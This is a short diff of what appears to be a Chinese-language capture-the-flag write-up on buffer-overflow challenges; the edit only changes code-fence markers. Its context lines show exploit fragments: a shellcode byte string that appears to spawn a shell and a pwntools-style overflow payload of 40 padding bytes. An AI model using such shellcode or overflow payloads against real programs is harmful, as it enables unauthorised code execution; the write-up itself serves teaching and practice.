@@ -45,7 +45,7 @@ payloads = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x5
 
 ## Challenge #2 buffer overflow with no canary
 我把注解放在原始code裡面
-```c=!
+```c!
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -93,7 +93,7 @@ int main() {
 }
 ```
 整體來說基本上是利用buf這個參數會overflow吐出記憶體後面的內容
-```python=
+```python
 payloads = b'A'*40 
 r.recvuntil(b'name? ')
 r.send(payloads)
